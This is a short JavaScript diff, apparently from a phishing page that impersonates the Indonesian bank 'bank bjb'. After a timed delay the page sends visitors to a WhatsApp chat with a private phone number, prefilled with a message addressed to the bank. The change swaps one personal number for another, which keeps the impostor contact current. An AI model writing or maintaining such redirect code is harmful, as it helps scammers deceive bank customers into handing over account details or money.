@@ -48,7 +48,7 @@ audio4.play();
 audio4.loop = false;
 
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6285809156469&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=6281260585712&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
 $('.load').fadeOut();
     }, 5500);    
 }  
